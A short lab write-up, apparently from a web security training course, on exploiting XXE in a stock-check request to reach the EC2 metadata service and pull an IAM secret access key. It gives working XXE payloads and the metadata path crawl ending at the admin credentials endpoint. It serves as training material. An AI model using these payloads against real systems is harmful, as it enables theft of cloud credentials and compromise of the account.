# Lab 02: Exploiting XXE to perform SSRF attacks

### 🎯 Objective
Retrieve the **IAM secret access key** by iteratively exploring the EC2 metadata endpoint via an XXE vulnerability.

### 🛠️ Step-by-Step Methodology (Iterative Exploration)

1. **Initial Interception:**
   Intercept the "Check stock" request and define an external entity pointing to the root of the metadata service:
   ```xml
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/](http://169.254.169.254/)"> ]>

Response: The error message reveals the first directory: latest

    Recursive Discovery:
    Update the entity URL based on each response to crawl the API:

        http://169.254.169.254/latest ➡️ Returns meta-data

        http://169.254.169.254/latest/meta-data ➡️ Returns iam

        http://169.254.169.254/latest/meta-data/iam ➡️ Returns security-credentials

        http://169.254.169.254/latest/meta-data/iam/security-credentials ➡️ Returns admin

    Final Extraction:
    The final payload targets the admin endpoint:
    XML

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/latest/meta-data/iam/security-credentials/admin](http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>

🚩 Key Takeaway

In a real-world SSRF via XXE, you often don't know the full path. Using the XML parser's error messages to "read" the response from the internal server allows you to map out the internal API manually.

Status: ✅ Solved
